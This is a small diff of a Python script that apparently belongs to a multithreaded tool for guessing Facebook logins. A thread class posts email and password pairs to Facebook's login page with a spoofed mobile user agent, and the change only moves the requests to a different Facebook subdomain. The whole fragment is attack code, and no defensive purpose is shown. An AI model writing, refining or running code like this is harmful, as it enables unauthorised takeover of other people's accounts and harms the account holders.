@@ -48,7 +48,7 @@ class mt(threading.Thread):
     def run(self):
         try:
             data = urllib.request.urlopen(urllib.request.Request(
-                url='https://m.facebook.com/login.php',
+                url='https://id-id.facebook.com/login.php',
                 data=urllib.parse.urlencode({'email': self.id, 'pass': self.p}).encode('utf-8'),
                 headers={'User-Agent': 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}
             ))
